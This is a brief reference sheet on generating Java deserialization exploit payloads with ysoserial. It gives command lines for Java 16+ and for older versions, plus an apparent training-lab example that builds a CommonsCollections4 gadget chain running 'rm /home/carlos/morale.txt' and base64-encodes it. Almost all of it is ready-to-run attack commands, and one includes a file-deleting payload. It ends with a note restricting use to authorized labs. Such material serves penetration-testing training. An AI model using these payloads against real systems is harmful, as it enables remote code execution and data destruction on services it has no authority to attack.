# Java ysoserial Reference

## Java 16+

```bash
java \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
 --add-opens=java.base/java.net=ALL-UNNAMED \
 --add-opens=java.base/java.util=ALL-UNNAMED \
 -jar ysoserial-all.jar [payload] '[command]'
```

## Java 15 and below

```bash
java -jar ysoserial-all.jar [payload] '[command]'
```

## Academy lab example

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

Use only against authorized lab/test environments.
